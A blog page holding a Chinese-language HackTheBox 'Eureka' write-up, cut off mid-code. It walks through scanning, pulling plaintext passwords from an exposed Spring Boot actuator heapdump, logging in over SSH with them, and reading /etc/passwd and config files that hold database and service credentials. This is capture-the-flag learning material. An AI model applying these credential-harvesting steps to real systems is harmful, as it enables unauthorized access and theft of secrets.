<!DOCTYPE html>
<html lang="zh">

<head>
  <!-- Website mata -->
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<!-- Disable transformation -->
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<!-- Website description -->


<!-- Website keywords -->




<!-- Website rss -->

<link rel="alternate" href="/default" title="N0nome`s Fucking Life" >


<!-- Website favicon -->

<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3.0.0" />


<!-- Canonical, good for google search engine -->
<link rel="canonical" href="https://n0nome.github.io/page/2/" />

<!-- Fancybox styling -->

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />


<!-- MathJax (LaTeX) support -->


<!-- Theme styling -->
<link rel="stylesheet" type="text/css" href="/css/style.css?v=3.0.0" />

<!-- Analytics and push -->



  



<!-- LeanCloud Counter -->


<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null,"server_url":null,"cdn":null},"toc":true,"fancybox":true,"latex":false};
</script>
  
  <title>N0nome`s Fucking Life</title>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div class="scrollPercentage"></div>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">N0nome`s Fucking Life</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
    <a href="/">
      <li class="mobile-menu-item">
        
        
        Home              </li>
    </a>
    
  </ul>
</nav>
  <div class="container" id="mobile-panel">
    <header id="header" class="header">
      <div class="logo-wrapper">  
  <a href="/." class="logo">N0nome`s Fucking Life</a>  
</div>  
  
<nav class="site-navbar">  
    
    <ul id="menu" class="menu">  
        
        <li class="menu-item">  
          <a class="menu-item-link" href="/">  
              
              
              Home  
              
          </a>  
        </li>  
        
    </ul>  
    
</nav>  

    </header>
    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <section id="posts" class="posts">
  
  
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Eureka/Eureka/">HackTheBox——HTB Eureka Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> nmap -sV -p22,80 -O --min-rate 1000 <span class="variable">$IP</span> -oN nmap.txt --append-output </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-28 15:58 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.77.240</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>是我扫的问题吗，啥也没扫出来，先80看一下</p>
<h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>IP打开会出现域名<code>http://furni.htb/</code>，加到hosts里面去<br><img src="/images/eureka.png"><br>有注册先注册一下<br>那个小人头是登录的按钮<br><img src="/images/eureka-1.png"><br>尝试注册了之后也登录不上去，真是奇了个怪<br><img src="/images/eureka-2.png"><br>诚心的吧<br>扫扫子域和目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> ffuf -w /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <span class="string">&#x27;http://furni.htb/&#x27;</span> -H <span class="string">&quot;HOST:FUZZ.furni.htb&quot;</span> -mc all -fw 6                                      </span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\                                                                                                                                                            </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                            </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                           </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                           </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                            </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/                                                                                                                                                            </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                   </span></span><br><span class="line"><span class="string">       v2.1.0-dev                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">________________________________________________                                                                                                                                                   </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                   </span></span><br><span class="line"><span class="string"> :: Method           : GET                                                                                                                                                                         </span></span><br><span class="line"><span class="string"> :: URL              : http://furni.htb/                                                                                                                                                           </span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt                                                                                      </span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.furni.htb                                                                                                                                                        </span></span><br><span class="line"><span class="string"> :: Follow redirects : false                                                                                                                                                                       </span></span><br><span class="line"><span class="string"> :: Calibration      : false                                                                                                                                                                       </span></span><br><span class="line"><span class="string"> :: Timeout          : 10                                                                                                                                                                          </span></span><br><span class="line"><span class="string"> :: Threads          : 40                                                                                                                                                                          </span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: all                                                                                                                                                        </span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 6                                                                                                                                                           </span></span><br><span class="line"><span class="string">________________________________________________    </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://furni.htb                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3              </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                          </span><br><span class="line">                                                                                                 </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line">                                                                                                 </span><br><span class="line">Output File: /home/wansh/HackTheBox/Eureka/reports/http_furni.htb/_25-04-28_16-20-56.txt</span><br><span class="line">                                                                                                 </span><br><span class="line">Target: http://furni.htb/                    </span><br><span class="line">                                                                                                 </span><br><span class="line">[16:20:56] Starting:   </span><br><span class="line">[16:22:13] 200 -    2KB - /actuator</span><br><span class="line">[16:22:13] 200 -   20B  - /actuator/caches       </span><br><span class="line">[16:22:14] 200 -  467B  - /actuator/features     </span><br><span class="line">[16:22:15] 200 -    2B  - /actuator/info         </span><br><span class="line">[16:22:15] 405 -  114B  - /actuator/refresh</span><br><span class="line">[16:22:15] 200 -   76MB - /actuator/heapdump     </span><br><span class="line">[16:22:15] 200 -    6KB - /actuator/env          </span><br><span class="line">[16:22:15] 400 -  108B  - /actuator/sessions</span><br><span class="line">[16:22:15] 200 -    3KB - /actuator/metrics</span><br><span class="line">[16:22:15] 200 -   54B  - /actuator/scheduledtasks</span><br><span class="line">[16:22:16] 200 -   15B  - /actuator/health       </span><br><span class="line">[16:22:16] 200 -   98KB - /actuator/loggers      </span><br><span class="line">[16:22:16] 200 -  198KB - /actuator/beans        </span><br><span class="line">[16:22:16] 200 -   35KB - /actuator/mappings</span><br><span class="line">[16:22:16] 200 -  180KB - /actuator/conditions   </span><br><span class="line">[16:22:21] 200 - 1014KB - /actuator/threaddump   </span><br><span class="line">[16:22:21] 400 -  106B  - /admin/%3bindex/       </span><br><span class="line">[16:22:22] 200 -   36KB - /actuator/configprops  </span><br><span class="line"><span class="comment"># feroxbuster没有扫出来什么有用的，</span></span><br><span class="line"><span class="comment"># 也许他需要时间，但是我也需要时间</span></span><br></pre></td></tr></table></figure>
<p>整理一下有用的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /actuator/features</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;enabled&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;com.netflix.discovery.EurekaClient&quot;</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Eureka Client&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;2.0.3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;vendor&quot;</span>: null</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;org.springframework.cloud.client.discovery.composite.CompositeDiscoveryClient&quot;</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;DiscoveryClient&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;4.1.4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;vendor&quot;</span>: <span class="string">&quot;Pivotal Software, Inc.&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;org.springframework.cloud.loadbalancer.blocking.client.BlockingLoadBalancerClient&quot;</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;LoadBalancerClient&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;4.1.4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;vendor&quot;</span>: <span class="string">&quot;Pivotal Software, Inc.&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;disabled&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># heapdump是下载一个文件</span></span><br><span class="line">$ file heapdump </span><br><span class="line">heapdump: Java HPROF dump, created Thu Aug  1 18:29:32 2024</span><br><span class="line"><span class="comment">#然后在这个文件里可以grep一下</span></span><br><span class="line">$ strings heapdump| grep password</span><br><span class="line">...</span><br><span class="line">&#123;password=0sc@r190_S0l!dP@sswd, user=oscar190&#125;!</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 真成丁真了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 剩下的200的也可以翻一翻，但是都没啥太有用的信息（对我这个菜鸡来说）</span></span><br></pre></td></tr></table></figure>
<p>找到的用户名密码，直接尝试ssh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ssh oscar190@furni.htb         </span><br><span class="line">The authenticity of host <span class="string">&#x27;furni.htb (10.129.77.240)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>furni.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">oscar190@furni.htb&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-214-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line"> System information as of Mon 28 Apr 2025 08:36:33 AM UTC</span><br><span class="line"></span><br><span class="line">  System load:           0.12</span><br><span class="line">  Usage of /:            66.2% of 6.79GB</span><br><span class="line">  Memory usage:          48%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             242</span><br><span class="line">  Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.129.77.240</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:8240</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">2 additional security updates can be applied with ESM Apps.</span><br><span class="line">Learn more about enabling ESM Apps service at https://ubuntu.com/esm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Mon Apr 28 08:36:35 2025 from 10.10.16.18</span><br><span class="line">oscar190@eureka:~$ </span><br></pre></td></tr></table></figure>
<p>嚯，给了一个普通用户<strong>oscar190:0sc@r190_S0l!dP@sswd</strong></p>
<h2 id="shell-as-oscar190"><a href="#shell-as-oscar190" class="headerlink" title="shell as oscar190"></a>shell as oscar190</h2><p>传一个linpeas看一下</p>
<h3 id="port-8761-Eureka-server"><a href="#port-8761-Eureka-server" class="headerlink" title="port 8761 Eureka-server"></a>port 8761 Eureka-server</h3><p>可以发现有数据库在运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From <span class="string">&#x27;/etc/mysql/mariadb.conf.d/50-server.cnf&#x27;</span> Mysql user: user                    = mysql</span><br><span class="line">Found readable /etc/mysql/my.cnf</span><br><span class="line">[client-server]</span><br><span class="line">!includedir /etc/mysql/conf.d/</span><br><span class="line">!includedir /etc/mysql/mariadb.conf.d/</span><br><span class="line">[mysqld]</span><br><span class="line">performance_schema = 0</span><br></pre></td></tr></table></figure>
<p>但是尝试也没啥用，另外还有好几个端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">oscar190@eureka:/var/www/web$ ss -tulnp</span><br><span class="line">Netid              State               Recv-Q              Send-Q                                Local Address:Port                            Peer Address:Port              Process              </span><br><span class="line">udp                UNCONN              0                   0                                     127.0.0.53%lo:53                                   0.0.0.0:*                                      </span><br><span class="line">udp                UNCONN              0                   0                                           0.0.0.0:68                                   0.0.0.0:*                                      </span><br><span class="line">udp                UNCONN              0                   0                                                 *:38316                                      *:*                                      </span><br><span class="line">udp                UNCONN              0                   0                                                 *:55754                                      *:*                                      </span><br><span class="line">udp                UNCONN              0                   0                                                 *:60021                                      *:*                                      </span><br><span class="line">udp                UNCONN              0                   0                                                 *:35761                                      *:*                                      </span><br><span class="line">tcp                LISTEN              0                   80                                        127.0.0.1:3306                                 0.0.0.0:*                                      </span><br><span class="line">tcp                LISTEN              0                   511                                         0.0.0.0:80                                   0.0.0.0:*                                      </span><br><span class="line">tcp                LISTEN              0                   4096                                  127.0.0.53%lo:53                                   0.0.0.0:*                                      </span><br><span class="line">tcp                LISTEN              0                   128                                         0.0.0.0:22                                   0.0.0.0:*                                      </span><br><span class="line">tcp                LISTEN              0                   4096                             [::ffff:127.0.0.1]:8080                                       *:*                                      </span><br><span class="line">tcp                LISTEN              0                   511                                            [::]:80                                      [::]:*                                      </span><br><span class="line">tcp                LISTEN              0                   100                              [::ffff:127.0.0.1]:8081                                       *:*                                      </span><br><span class="line">tcp                LISTEN              0                   100                              [::ffff:127.0.0.1]:8082                                       *:*                                      </span><br><span class="line">tcp                LISTEN              0                   128                                            [::]:22                                      [::]:*                                      </span><br><span class="line">tcp                LISTEN              0                   100                                               *:8761                                       *:*                                      </span><br></pre></td></tr></table></figure>
<p>并且还可以在<code>/var/www/web/</code>目录下还可以找到一些凭证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">oscar190@eureka:/var/www/web$ <span class="built_in">cat</span> ./Eureka-Server/target/classes/application.yaml</span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: <span class="string">&quot;Eureka Server&quot;</span></span><br><span class="line"></span><br><span class="line">  security:</span><br><span class="line">    user:</span><br><span class="line">      name: EurekaSrvr</span><br><span class="line">      password: 0scarPWDisTheB3st</span><br><span class="line"></span><br><span class="line">server:</span><br><span class="line">  port: 8761</span><br><span class="line">  address: 0.0.0.0</span><br><span class="line"></span><br><span class="line">eureka:</span><br><span class="line">  client:</span><br><span class="line">    register-with-eureka: <span class="literal">false</span></span><br><span class="line">    fetch-registry: <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>8761的看着像有了，先转发出来试一下<br><img src="/images/eureka-3.png"><br>登录页，尝试一下上面的账号和密码<br><img src="/images/eureka-4.png"><br>oh yes yes oh my god<br>那看样子之前在80端口扫出来的目录&#x2F;actuator目录可能是关于这个应用的了<br>Google一下有没有相关的CVE，我才可能是反序列化了<br>那么就需要一下相关的版本信息，回到80端口的那些网页找一下<br>看了一下可能只有features有了<br>（上面列出来过）</p>
<p>（经过努力寻找）<br>只找到一个有关于低版本的<a target="_blank" rel="noopener" href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Spring%20Boot/Spring%20Boot%20eureka%20xstream%20deserialization%20rce/">RCE</a>，尝试一下吧</p>
<p>好吧，用不了</p>
<p>再回归到本地的应用配置当中去<br>看一下<code>/etc/passwd</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">oscar190@eureka:/var/www$ <span class="built_in">cat</span> /etc/passwd | grep sh                                                                                                                                                </span><br><span class="line">root:x:0:0:root:/root:/bin/bash                                                                                                                                                                    </span><br><span class="line">fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin                                                                                                                       </span><br><span class="line">sshd:x:113:65534::/run/sshd:/usr/sbin/nologin                                                                                                                                                      </span><br><span class="line">oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash                                                                                                                                                  </span><br><span class="line">miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash           </span><br></pre></td></tr></table></figure>
<p>到<code>/var/www/web</code>下面先看看有没有凭证用，没有<br>再看一下相关的配置<br><img src="/images/eureka-5.png"><br>这个是有关于用户的，从这里下手吧</p>
<p>其实还可以在文件夹下找到log文件夹，里面有日志信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">oscar190@eureka:/var/www/web/user-management-service$ <span class="built_in">tail</span> -f <span class="built_in">log</span>/application.log</span><br><span class="line">2025-04-09T11:32:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:33:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:34:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:35:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:36:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:37:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:38:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:39:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:40:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-09T11:41:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line">2025-04-28T11:47:01.699Z  INFO 1322 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-9] c.e.Furni.Security.LoginSuccessLogger    : User <span class="string">&#x27;miranda.wise@furni.htb&#x27;</span> logged <span class="keyword">in</span> successfully</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里也可以看到我们需要对user-management-service进行<br>那我们进行登录的形式可以burp抓一下看看<br><img src="/images/eureka-6.png"><br><img src="/images/eureka-7.png"><br>可以看到他的认证方式<br>顺便在<code>/var/www/web/user-management-service/src/main/resources</code>也可以看到他的配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">oscar190@eureka:/var/www/web/user-management-service/src/main/resources$ <span class="built_in">cat</span> application.properties                                                                                                                </span><br><span class="line">spring.application.name=USER-MANAGEMENT-SERVICE                                                                                                                                                                    </span><br><span class="line">spring.session.store-type=jdbc                                                                           </span><br><span class="line">spring.cloud.inetutils.ignoredInterfaces=enp0s.*                                                         </span><br><span class="line">spring.cloud.client.hostname=localhost              </span><br><span class="line"><span class="comment">#Eureka</span></span><br><span class="line">eureka.client.service-url.defaultZone= http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/</span><br><span class="line">eureka.instance.hostname=localhost</span><br><span class="line">eureka.instance.prefer-ip-address=<span class="literal">false</span></span><br><span class="line"><span class="comment">#Mysql</span></span><br><span class="line">spring.jpa.hibernate.ddl-auto=none</span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/Furni_WebApp_DB</span><br><span class="line">spring.datasource.username=oscar190</span><br><span class="line">spring.datasource.password=0sc@r190_S0l!dP@sswd</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.jpa.properties.hibernate.format_sql=<span class="literal">true</span></span><br><span class="line"><span class="comment">#tomcat</span></span><br><span class="line">server.address=localhost</span><br><span class="line">server.port=8081</span><br><span class="line"><span 